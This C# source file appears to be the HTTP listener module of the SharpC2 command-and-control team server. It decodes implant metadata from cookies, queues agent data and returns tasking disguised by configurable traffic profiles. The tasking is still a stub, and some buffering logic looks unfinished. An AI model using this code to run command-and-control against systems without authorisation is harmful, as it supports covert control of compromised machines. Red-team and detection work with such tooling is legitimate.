using AgentCore;
using AgentCore.Models;
using Common;
using Common.Models;
using Microsoft.AspNetCore.Mvc.RazorPages.Infrastructure;
using System;
using System.Collections.Generic;
using System.Globalization;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using System.Transactions;
using TeamServer.Interfaces;
using TeamServer.Listeners;
using TeamServer.Models;

namespace TeamServer.Modules
{
    

    public class StateObject
    {
        public Socket workSocket = null;
        public const int BufferSize = 1024;
        public byte[] buffer = new byte[BufferSize];
        public byte[] data = null;

    }

    public class HTTPCommModule : ICommModule
    {
        
        public ListenerHttp Listener { get; set; }
        private Socket Socket { get; set; }

        public ModuleStatus ModuleStatus { get; private set; } = ModuleStatus.Stopped;
        private Queue<(Metadata, C2Data)> InboundQueue { get; set; } = new Queue<(Metadata, C2Data)>();
        private byte[] PrependData { get; set; } = new byte[] { };
        private byte[] AppenedData { get; set; } = new byte[] { };

        private static ManualResetEvent AllDone = new ManualResetEvent(false);
        public void Init()
        {
            Socket = new Socket(SocketType.Stream, ProtocolType.IP);
            //PrependData = ProcessOutputProfile(Listener.TrafficProfile.ServerProfile.OutputProfile.PrependData);
            //AppenedData = ProcessOutputProfile(Listener.TrafficProfile.ServerProfile.OutputProfile.AppendData);
        }

        //public void Start()
        //{
        //    Socket.Bind(new IPEndPoint(IPAddress.Parse("0.0.0.0"), Listener.BindPort));
        //    Socket.Listen(20);
        //}
        public void Start()
        {
            ModuleStatus = ModuleStatus.Running;

            try
            {
                Socket.Bind(new IPEndPoint(IPAddress.Parse("0.0.0.0"), Listener.BindPort));
                Socket.Listen(100);

                Task.Factory.StartNew(delegate ()
                {
                    while (ModuleStatus == ModuleStatus.Running)
                    {
                        AllDone.Reset();
                        Socket.BeginAccept(new AsyncCallback(AcceptCallback), Socket);
                        AllDone.WaitOne();
                    }
                });
            }
            catch (Exception e)
            {
                throw new Exception(e.Message);
            }
        }

        private void AcceptCallback(IAsyncResult ar)
        {
            AllDone.Set();

            var listener = ar.AsyncState as Socket;

            if (ModuleStatus == ModuleStatus.Running)
            {
                var handler = listener.EndAccept(ar);
                var state = new StateObject { workSocket = handler };
                handler.BeginReceive(state.buffer, 0, StateObject.BufferSize, 0, new AsyncCallback(ReadCallback), state);
            }
        }

        private void ReadCallback(IAsyncResult ar)
        {
            /*
            var state = ar.AsyncState as StateObject;
            var handler = state.workSocket;
            var bytesRead = handler.EndReceive(ar);
            //var data = state.buffer;

            if (bytesRead > 0)
            {
                var dataReceived = state.buffer; //new
                var webRequest = Encoding.UTF8.GetString(dataReceived); //new

                var metadata = ExtractMetadata(webRequest);
                var agentTasks = GetAgentTask(dataReceived); //new
                var transformedData = TransformOutputData(agentTasks); //new
                SendData(handler, transformedData); //new
                //SendData(handler, data);
            }
            */

            
            var state = ar.AsyncState as StateObject;
            var handler = state.workSocket;
            var bytesRead = 0;

            try
            {
                bytesRead = handler.EndReceive(ar);
            }
            catch (SocketException)
            {
                // client socket has gone away for "reason" 
            }
            if (bytesRead > 0)
            {
                //var dataReceived = state.buffer.TrimBytes();
                var dataReceived = TrimBytes(state.buffer);
                var webRequest = Encoding.UTF8.GetString(dataReceived);

                if (webRequest.Contains("Expect: 100-continue") || dataReceived.Length == state.buffer.Length)
                {
                    state.data = new byte[dataReceived.Length];
                    Array.Copy(dataReceived, state.data, dataReceived.Length);
                    Array.Clear(state.buffer, 0, state.buffer.Length);
                    handler.BeginReceive(state.buffer, 0, StateObject.BufferSize, 0, new AsyncCallback(ReadCallback), state);
                }
                else
                {
                    var final = new byte[state.data.Length + dataReceived.Length];
                    Buffer.BlockCopy(state.data, 0, final, 0, state.data.Length);
                    Buffer.BlockCopy(dataReceived, 0, final, state.data.Length, dataReceived.Length);

                    var finalRequest = Encoding.UTF8.GetString(final);

                    var metadata = ExtractMetadata(finalRequest);
                    if (metadata != null) //valid agent
                    {
                        var c2Data = ExtractC2Data(finalRequest);
                        if (c2Data != null)
                        {
                            InboundQueue.Enqueue((metadata, c2Data));
                        }

                        var agentTasks = GetAgentTask(dataReceived);
                        var transformedData = TransformOutputData(agentTasks);
                        SendData(handler, transformedData);
                    }
                }
            }


        }

        private byte[] TrimBytes(byte[] bytes)
        {
            var index = bytes.Length - 1;
            while (bytes[index] == 0) { index--; }
            byte[] copy = new byte[index + 1];
            Array.Copy(bytes, copy, index + 1);
            return copy;
        }

        private void SendData(Socket handler, byte[] dataReceived)
        {
            //var valid =  GetAgentTask(dataReceived);
            //if (valid) { SendAgentTask } else { SendSomeJunk }

            var agentTasks = GetAgentTask(dataReceived);
            var transformedData = TransformOutputData(agentTasks);

            var response = new StringBuilder("HTTP/1.1 200 OK\r\n");
            foreach (var header in Listener.TrafficProfile.ServerProfile.Headers)
            {
                response.Append(string.Format("{0}: {1}\r\n", header.Key, header.Value));
            }
            response.Append(string.Format("Content-Length: {0}\r\n", transformedData.Length));
            response.Append(string.Format("Date: {0}\r\n", DateTime.UtcNow.ToString("ddd, d MMM yyyy HH:mm:ss UTC")));
            response.Append("\r\n");
            var headers = Encoding.UTF8.GetBytes(response.ToString());

            var dataToSend = new byte[transformedData.Length + headers.Length];
            Buffer.BlockCopy(headers, 0, dataToSend, 0, headers.Length);
            Buffer.BlockCopy(transformedData, 0, dataToSend, headers.Length, transformedData.Length);

            handler.BeginSend(dataToSend, 0, dataToSend.Length, 0, new AsyncCallback(SendCallback), handler);
        }

        private byte[] GetAgentTask(byte[] data)
        {
            // check data?
            return Encoding.UTF8.GetBytes("Hello from SharpC2");
        }

        private byte[] TransformOutputData(byte[] data)
        {
            var transformedData = new byte[] { };
            var preppendData = new byte[] { };
            var appendData = new byte[] { };

            switch (Listener.TrafficProfile.ServerProfile.OutputProfile.DataTransform)
            {
                case HttpTrafficProfile.DataTransform.Raw:
                    transformedData = data;
                    break;
                case HttpTrafficProfile.DataTransform.Base64:
                    transformedData = Encoding.UTF8.GetBytes(Convert.ToBase64String(data));
                    break;
                default:
                    break;
            }

            if (!string.IsNullOrEmpty(Listener.TrafficProfile.ServerProfile.OutputProfile.PrependData))
            {
                if (Listener.TrafficProfile.ServerProfile.OutputProfile.PrependData.Substring(0, 2).Equals("\\x"))
                {
                    preppendData = ParseBytes(Listener.TrafficProfile.ServerProfile.OutputProfile.PrependData);
                }
                else
                {
                    preppendData = Encoding.UTF8.GetBytes(Listener.TrafficProfile.ServerProfile.OutputProfile.PrependData);
                }
            }

            if (!string.IsNullOrEmpty(Listener.TrafficProfile.ServerProfile.OutputProfile.AppendData))
            {
                if (Listener.TrafficProfile.ServerProfile.OutputProfile.AppendData.Substring(0, 2).Equals("\\x"))
                {
                    appendData = ParseBytes(Listener.TrafficProfile.ServerProfile.OutputProfile.AppendData);
                }
                else
                {
                    appendData = Encoding.UTF8.GetBytes(Listener.TrafficProfile.ServerProfile.OutputProfile.AppendData);
                }
            }

            var result = new byte[preppendData.Length + transformedData.Length + appendData.Length];
            Buffer.BlockCopy(preppendData, 0, result, 0, preppendData.Length);
            Buffer.BlockCopy(transformedData, 0, result, preppendData.Length, transformedData.Length);
            Buffer.BlockCopy(appendData, 0, result, (preppendData.Length + transformedData.Length), appendData.Length);

            return result;

        }

        private byte[] ProcessOutputProfile(string data)
        {
            var result = new byte[] { };
            if (data != default)
            {
                if (data.Substring(0, 2).Equals("\\x"))
                {
                    result = ParseBytes(data);
                }
                else
                {
                    result = Encoding.UTF8.GetBytes(data);
                }
            }

            return result;
        }

        private byte[] ParseBytes(string data)
        {
            var bytes = new List<byte>();
            var split = data.Split("\\x");
            foreach (var byteString in split)
            {
                if (!string.IsNullOrEmpty(byteString))
                { 
                    byte.TryParse(byteString, NumberStyles.HexNumber, null, out byte parsedByte);
                    bytes.Add(parsedByte);
                }
            }
            return bytes.ToArray();
        }

        private C2Data ExtractC2Data(string webRequest)
        {
            C2Data c2Data = null;

            var regex = Regex.Match(webRequest, "Data=([^\\s].*)");
            if (regex.Captures.Count > 0)
            {
                c2Data = Serialisation.DeserialiseData<C2Data>(Convert.FromBase64String(regex.Groups[1].Value.Replace("\0","")));
            }
            return c2Data;
        }
        private Metadata ExtractMetadata(string webRequest)
        {
            Metadata metadata = null;
            var regex = Regex.Match(webRequest, "Cookie: ([^\\s].*)");
            if (regex.Captures.Count > 0)
            {
                metadata = Serialisation.DeserialiseData<Metadata>(Convert.FromBase64String(regex.Groups[1].Value));
            }
            return metadata;
        }

        private void SendCallback(IAsyncResult ar)
        {
            try
            {
                var handler = ar.AsyncState as Socket;
                var bytesSent = handler.EndSend(ar);
                handler.Shutdown(SocketShutdown.Both);
                handler.Close();
            }
            catch (SocketException e)
            {
                throw new Exception(e.Message);
            }
        }

        public void Stop()
        {
            ModuleStatus = ModuleStatus.Stopped;
            Socket.Close();
            //Socket.Close();
            //Socket.Dispose();
        }
        //public bool SendData(C2Data data)
        //{
        //    //do stuff
        //}



        public bool RecvData(out Metadata metadata, out C2Data data)
        {
            if (InboundQueue.Count > 0)
            {
                var tuple = InboundQueue.Dequeue();
                metadata = tuple.Item1;
                data = tuple.Item2;

                return true;
            }

            metadata = null;
            data = null;
            return false;
        }
    }
}